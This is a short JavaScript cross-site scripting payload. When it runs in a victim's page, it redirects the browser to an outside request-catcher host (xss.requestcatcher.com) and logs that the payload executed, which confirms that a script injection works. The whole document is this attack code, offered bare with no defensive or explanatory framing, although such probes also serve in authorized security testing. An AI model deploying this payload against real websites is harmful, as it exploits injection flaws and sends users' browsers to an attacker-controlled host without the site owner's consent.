function xssPayload() {
  document.location="https://xss.requestcatcher.com/test";
}

console.log('XSS payload executed');
xssPayload();
